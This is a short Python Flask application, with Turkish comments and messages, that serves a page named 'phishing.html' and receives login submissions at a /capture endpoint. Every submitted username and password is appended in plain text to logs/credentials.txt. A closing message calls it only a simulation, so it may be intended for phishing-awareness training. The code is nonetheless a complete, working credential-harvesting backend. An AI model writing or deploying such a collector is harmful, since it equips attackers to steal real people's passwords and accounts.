from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('phishing.html')

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Verileri bir log dosyasına yaz
    with open('logs/credentials.txt', 'a') as file:
        file.write(f"Flask -> Kullanıcı Adı: {username}, Şifre: {password}\n")
    
    return "Flask üzerinden veriler alındı. Bu sadece bir simülasyon."

if __name__ == '__main__':
    app.run(debug=True)
